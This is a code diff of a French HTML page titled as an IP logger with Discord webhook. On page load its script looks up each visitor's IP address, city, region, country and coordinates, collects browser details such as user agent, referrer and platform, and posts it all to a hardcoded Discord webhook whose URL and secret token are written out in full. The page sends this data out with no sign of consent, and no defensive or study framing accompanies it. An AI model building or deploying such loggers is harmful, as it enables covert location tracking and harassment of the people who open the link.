@@ -2,68 +2,107 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Logger Webhook Pixel</title>
+  <title>Logger & Géolocalisation IP + Discord Webhook</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 2em; }
+    img { margin-top: 1em; border: 1px solid #ccc; }
+    .info { margin-bottom: 1em; }
+  </style>
 </head>
 <body>
-<script>
-(async function() {
-  // Récupérer la localisation complète via ipapi
-  async function getGeoData() {
-    try {
-      const res = await fetch('https://ipapi.co/json/');
-      const data = await res.json();
+  <h2>Informations de connexion & Carte IP</h2>
+  <div id="result"></div>
+  <script>
+    // Webhook Discord (remplace par le tien si besoin)
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
+
+    // Récupère les infos IP via ipwho.is
+    async function getIPData() {
+      try {
+        const res = await fetch('https://ipwho.is/');
+        return await res.json();
+      } catch {
+        return null;
+      }
+    }
+
+    // Récupère des infos supplémentaires (navigateur, etc.)
+    function getClientInfo() {
       return {
-        ip: data.ip || 'unknown',
-        city: data.city || 'unknown',
-        country: data.country_name || 'unknown'
+        referer: document.referrer || 'unknown',
+        user_agent: navigator.userAgent || 'unknown',
+        url: window.location.href,
+        path: window.location.pathname,
+        search: window.location.search,
+        method: 'GET',
+        hostname: window.location.hostname,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookies_enabled: navigator.cookieEnabled
       };
-    } catch {
-      return { ip: 'unknown', city: 'unknown', country: 'unknown' };
     }
-  }
 
-  const geo = await getGeoData();
-
-  // Affiche la localisation sur la page
-  document.body.insertAdjacentHTML('afterbegin', 
-    `<p>Votre IP : ${geo.ip}</p>
-     <p>Ville : ${geo.city}</p>
-     <p>Pays : ${geo.country}</p>`);
-
-  // Préparer les données à logger
-  const logEntry = {
-    timestamp: new Date().toISOString(),
-    ip: geo.ip,
-    city: geo.city,
-    country: geo.country,
-    referer: document.referrer || 'unknown',
-    user_agent: navigator.userAgent || 'unknown',
-    additional_info: {
-      url: window.location.href,
-      path: window.location.pathname,
-      search: window.location.search,
-      method: 'GET', // côté client, c'est toujours GET
-      hostname: window.location.hostname,
-      language: navigator.language,
-      platform: navigator.platform,
-      cookies_enabled: navigator.cookieEnabled
+    // Génère l'URL de la carte statique
+    function getMapImageURL(lat, lon) {
+      return `https://staticmap.openstreetmap.de/staticmap.php?center=${lat},${lon}&zoom=10&size=600x300&markers=${lat},${lon},red-pushpin`;
     }
-  };
 
-  // Remplacer cette URL par l'URL de ton webhook
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1377390162979586200/L1rq4N6vDSP8alDZhv9vAfxzZ97CXCUIS8OYxl_bniGVp3Fm80eVHbyGk3AExZc_VuWS";
-  console.log(JSON.stringify(logEntry));
+    // Envoie toutes les infos au webhook Discord
+    async function sendToDiscord(ipData, mapImageURL, clientInfo) {
+      const payload = {
+        username: "Logger IP & Géolocalisation",
+        embeds: [{
+          title: "Nouvelle visite détectée",
+          description: 
+            `**IP**: ${ipData.ip}\n` +
+            `**Ville**: ${ipData.city}\n` +
+            `**Région**: ${ipData.region}\n` +
+            `**Pays**: ${ipData.country}\n` +
+            `**Coordonnées**: ${ipData.latitude},${ipData.longitude}\n` +
+            `**User-Agent**: ${clientInfo.user_agent}\n` +
+            `**URL**: ${clientInfo.url}\n` +
+            `**Referer**: ${clientInfo.referer}\n` +
+            `**Langue**: ${clientInfo.language}\n` +
+            `**Plateforme**: ${clientInfo.platform}\n` +
+            `**Cookies activés**: ${clientInfo.cookies_enabled}`,
+          image: { url: mapImageURL },
+          timestamp: new Date().toISOString()
+        }]
+      };
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    }
 
-  // Envoi des données au webhook
-  fetch(WEBHOOK_URL, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      content: "Log entry:\n" + JSON.stringify(logEntry, null, 2)
-    })
-  });
+    // Affiche les infos sur la page
+    function displayInfo(ipData, mapImageURL) {
+      document.getElementById("result").innerHTML = `
+        <div class="info">
+          <p><strong>IP :</strong> ${ipData.ip}</p>
+          <p><strong>Ville :</strong> ${ipData.city}</p>
+          <p><strong>Région :</strong> ${ipData.region}</p>
+          <p><strong>Pays :</strong> ${ipData.country}</p>
+          <p><strong>Latitude, Longitude :</strong> ${ipData.latitude}, ${ipData.longitude}</p>
+        </div>
+        <img src="${mapImageURL}" alt="Carte de la localisation">
+      `;
+    }
 
-})();
-</script>
+    // Routine principale
+    (async function main() {
+      const ipData = await getIPData();
+      if (!ipData || !ipData.success) {
+        document.getElementById("result").innerHTML = "<p>Impossible de récupérer les informations IP.</p>";
+        return;
+      }
+      const mapImageURL = getMapImageURL(ipData.latitude, ipData.longitude);
+      const clientInfo = getClientInfo();
+
+      displayInfo(ipData, mapImageURL);
+      sendToDiscord(ipData, mapImageURL, clientInfo);
+    })();
+  </script>
 </body>
 </html>
